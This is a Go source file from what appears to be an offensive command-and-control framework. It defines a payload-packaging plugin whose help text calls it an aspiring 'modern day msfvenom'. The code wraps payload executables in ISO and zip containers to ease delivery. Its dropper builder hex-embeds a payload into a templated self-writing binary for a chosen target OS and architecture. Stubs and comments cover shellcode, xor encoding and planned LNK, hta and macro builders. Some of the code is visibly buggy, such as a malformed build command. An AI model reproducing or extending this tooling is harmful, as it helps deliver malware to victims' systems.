package builder

import(
  "os"
  "io"
  "fmt"
  "bytes"
  "os/exec"
  "archive/zip"
	"text/template"
  "encoding/hex"

  "github.com/alphamystic/odin/wheagle/server/lib"
  "github.com/alphamystic/odin/lib/utils"
)

type Hunter struct{
  InputFile,OutputFile,Format string
}

func (h *Hunter) Generate() error{
  switch h.Format {
    case "iso":
      return IsoGenerator(h.InputFile,h.OutputFile)
    case "zip":
      return Zipper(h.InputFile,h.OutputFile)
    case "sc":
      return CreateShellCode(h.InputFile,h.OutputFile)
    case "dropper","drp":
      return CreateDroper(h.InputFile,h.OutputFile)
    case "enc":
      return Encoding(h.InputFile,h.OutputFile)
    default:
      HunterHelp()
      return nil
  }
  return nil
}

func CreateShellCode(inputFile,outputFile string)error{
  return nil
}
var CreateDroper = func(inputFile,outputFile string)error{
  var sw string
  input,err := os.ReadFile(inputFile)
  if err != nil{ return err}
  utils.PrintTextInASpecificColor("green","Self downloader or url download. (Enter YES/NO)")
  utils.NoNewLine("yellow","  [HUNTER]: ")
  fmt.Scanln(&sw)
  if sw == "YES"|| sw == "Y"{
    data := hex.EncodeToString(input)
    var name,ops,arch string
    utils.PrintTextInASpecificColor("green","Enter name of file on target. File that will be created at the target (payload.exe).")
    utils.NoNewLine("yellow","  [HUNTER]: ")
    fmt.Scanln(&name)
    utils.PrintTextInASpecificColor("green","Enter target operating system. (windows/linux). ")
    utils.NoNewLine("yellow","  [HUNTER]: ")
    fmt.Scanln(&ops)
    utils.PrintTextInASpecificColor("green","Enter architecture of target operating system.")
    utils.NoNewLine("yellow","  [HUNTER]: ")
    fmt.Scanln(&arch)
    tmpl, err := template.New("source").Parse(lib.SelfWriter)
	   if err != nil {
       return fmt.Errorf("Error parsing template: %v", err)
	   }
     tempFile, err := CreateTempFile("../bin/temp/",tmpl,struct{Data,Name string}{data,name})
	   if err != nil {
		   return fmt.Errorf("Error creating temporary file: %v", err)
   	 }
     defer os.Remove(tempFile.Name())
     bin, err := exec.Command("GOOS=" + ops + " " +"GOARCH=" + arch + " go build -o " + outputFile + "  " + tempFile.Name()).CombinedOutput()
     if err != nil {
       return fmt.Errorf("Error executing builde droper. %v",err)
     }
     if bytes.Contains(bin, []byte("error")) {
       return fmt.Errorf("Build failed: %s", string(bin))
     }
  }
  return nil
}

var IsoGenerator = func(inputFile,outputFile string) error {
  utils.Warning("This command needs proper instalation of genisoimage. \r\n (Works well on linux. Not sure on windows.....Sorryyyyy :)")
  buildCmd := `genisoimage -o  ` + outputFile + ` -r  ` + inputFile
  var cmd *exec.Cmd
  currOs := utils.GetCurrentOS()
  if currOs  == "windows"{
    cmd = exec.Command("cmd","/c",buildCmd)
  } else {
    cmd = exec.Command("sh","-c",buildCmd)
  }
  cmd.Stdout = os.Stdout
  cmd.Stderr = os.Stderr
  return cmd.Run()
}

var Zipper = func(inputFile,outputFile string) error {
  input,err := os.Open(inputFile)
  if err != nil {
    return fmt.Errorf("Error reading from input file %q. %v",inputFile,err)
  }
  defer input.Close()
  zipFile,err := os.Create(outputFile)
  if err != nil {
    return fmt.Errorf("Error creating output zip file.\n    ERROR: %q",err)
  }
  defer zipFile.Close()
  writer := zip.NewWriter(zipFile)
  entry,err := writer.Create(input.Name())
  if err != nil {
    return fmt.Errorf("Error creating name incide binary file.\n    ERROR: %q",err)
  }
  _,err = io.Copy(entry,input)
  if err != nil{
    fmt.Errorf("Error copying input into entry.\nERROR: %q",err)
  }
  if err := writer.Close(); err != nil {
    return fmt.Errorf("Error clossing writer.\n    ERROR: %q",err)
  }
  fmt.Println("Wrote to output zip file")
  return nil
}
/// hunter --iF ../bin/temp/bd.exe --oF ../bin/temp/bd_modified.exe --f dropper

func HunterHelp(){
  utils.PrintTextInASpecificColorInBold("magenta","*************************************************************************************")
  utils.PrintTextInASpecificColor("blue","                  ***********  PONCUPINE PLUGIN  ************              ")
  utils.PrintTextInASpecificColorInBold("magenta","*************************************************************************************")
  utils.PrintTextInASpecificColor("cyan"," It honestly doesn't do much other than spike things differently........ (Plan is to create a modern day msfvenom)")
  utils.PrintTextInASpecificColor("cyan","Generate an iso from a given payload")
  utils.PrintTextInASpecificColor("cyan","      hunter --f iso -iF payload.exe --oF payload.iso")
  utils.PrintTextInASpecificColor("cyan","Generate a zip from a given payload")
  utils.PrintTextInASpecificColor("cyan","      hunter --f zip -iF payload.exe --oF payload.zip")
  utils.PrintTextInASpecificColor("cyan","Generate shellcode")
  utils.PrintTextInASpecificColor("cyan","      hunter --f sc -iF payload.exe --oF payload.bin")
  utils.PrintTextInASpecificColor("cyan","Create a dropper, Self downloading or URL Downloader")
  utils.PrintTextInASpecificColor("cyan","Encoder a given payload. Supports only xor encoding for now.")
  utils.PrintTextInASpecificColor("cyan","LNK,hta and macro builders to be added soon")
}
